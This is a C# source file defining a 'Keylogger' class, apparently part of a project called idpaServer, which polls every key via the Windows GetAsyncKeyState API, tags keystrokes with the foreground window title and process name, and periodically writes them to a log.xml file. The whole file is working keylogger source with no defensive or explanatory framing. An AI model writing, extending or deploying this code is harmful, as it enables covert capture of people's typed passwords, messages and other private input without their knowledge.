using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using IdpaTools;

namespace idpaServer
{
   
    static class Keylogger
    {
        static private string LOG_PATH = Controller.APP_PATH + @"\log.xml"; //Where the logfile will be stored

        static private string activeWindow;
        static private IdpaTools.Logger logger;

        //Import DDLs form Windows (needed for Captioring Keys)
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        static Keylogger()
        {
            logger = new IdpaTools.Logger();
            activeWindow = "";
            logger = Serilizer.getDataFromFile(LOG_PATH, logger);
        }

        static void CreateLog(string file)
        {
            try
            {
                Serilizer.writeDataToFile(LOG_PATH, logger);
                Console.WriteLine("Log Created");
            }
            catch
            {
            }
        }

        static public void KeyTick(object sender, EventArgs e)
        {
            if (activeWindow != GetActiveWindowTitle() && GetActiveWindowTitle() != null)
            {
                activeWindow = GetActiveWindowTitle();
                logger.applicationLog.Add(new IdpaTools.ApplicationLog());

                logger.applicationLog.Last<IdpaTools.ApplicationLog>().processName = GetActiveProcessFileName();
                logger.applicationLog.Last<IdpaTools.ApplicationLog>().windowName = activeWindow;
                logger.applicationLog.Last<IdpaTools.ApplicationLog>().date = DateTime.Now;
            }

            foreach (System.Int32 i in Enum.GetValues(typeof(System.Windows.Forms.Keys))) //Iterate through each key to know whether it was pressed or not
            {
                if (GetAsyncKeyState(i) == -32767)   //-32767(minimum value) indicates that key was pressed since we last called this function
                {
                    logger.applicationLog.Last<IdpaTools.ApplicationLog>().keyList.Add(Enum.GetName(typeof(System.Windows.Forms.Keys), i));
                }
            }
        }

        static public void LogTick(object sender, EventArgs e)
        {
            CreateLog(LOG_PATH);
        }

        static private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        static string GetActiveProcessFileName()
        {
            IntPtr hwnd = GetForegroundWindow();
            uint pid;
            GetWindowThreadProcessId(hwnd, out pid);
            Process p = Process.GetProcessById((int)pid);
            return p.ProcessName;
        }
    }
}
